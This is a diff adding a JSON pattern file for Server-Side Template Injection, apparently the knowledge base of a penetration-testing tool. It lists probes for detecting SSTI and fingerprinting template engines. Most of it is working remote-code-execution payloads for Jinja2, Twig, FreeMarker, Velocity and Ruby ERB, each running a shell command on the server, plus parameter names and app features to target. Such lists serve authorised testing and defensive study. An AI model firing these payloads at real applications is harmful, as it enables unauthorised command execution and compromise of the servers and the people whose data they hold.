@@ -1,0 +1,81 @@
+{
+  "type": "ssti_patterns",
+  "description": "Server-Side Template Injection detection and exploitation. SSTI often leads to RCE.",
+  "detection": {
+    "polyglot_probe": "${{<%[%'\"}}%\\",
+    "math_probes": {
+      "description": "Send math expression — if server evaluates it, SSTI confirmed",
+      "payloads": [
+        "{{7*7}}",
+        "${7*7}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        "${{7*7}}",
+        "{{7*'7'}}",
+        "${7*'7'}",
+        "@(7*7)"
+      ],
+      "confirm": "Response contains '49' = SSTI confirmed"
+    }
+  },
+  "engine_detection": {
+    "jinja2_twig":    "{{7*'7'}} → 7777777 (string multiplication)",
+    "jinja2":         "{{config}} → reveals Flask/Jinja2 config object",
+    "twig":           "{{_self.env.getCharset()}} → returns charset",
+    "freemarker":     "${7*7} → 49",
+    "velocity":       "#set($x=7*7)${x} → 49",
+    "smarty":         "{$smarty.version} or {php}echo 'hello';{/php}",
+    "pebble":         "{{7*7}}",
+    "mako":           "${7*7}",
+    "ruby_erb":       "<%= 7*7 %> → 49",
+    "ruby_slim":      "#{7*7}",
+    "django":         "{{7*7}} → 49 OR {{settings.SECRET_KEY}}"
+  },
+  "exploitation": {
+    "jinja2_rce": {
+      "description": "Python/Jinja2 RCE via class traversal",
+      "payloads": [
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'subprocess' in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()[0].strip()}}{% endif %}{% endfor %}"
+      ]
+    },
+    "twig_rce": {
+      "payloads": [
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "{{['id']|filter('system')}}",
+        "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}"
+      ]
+    },
+    "freemarker_rce": {
+      "payloads": [
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+      ]
+    },
+    "velocity_rce": {
+      "payloads": [
+        "#set($rt=$class.forName(\"java.lang.Runtime\"))#set($ex=$rt.getRuntime().exec(\"id\"))${ex.text}"
+      ]
+    },
+    "erb_rce": {
+      "payloads": [
+        "<%= `id` %>",
+        "<%= system('id') %>",
+        "<%= IO.popen('id').readlines() %>"
+      ]
+    }
+  },
+  "parameters_to_test": [
+    "template=", "page=", "name=", "content=", "subject=",
+    "message=", "greeting=", "body=", "text=", "title="
+  ],
+  "context_clues": [
+    "App renders user-supplied text in HTML responses",
+    "Email templates with user data",
+    "PDF generation with user content",
+    "Error messages that reflect template syntax",
+    "Name personalization features ('Hello, NAME!')"
+  ]
+}
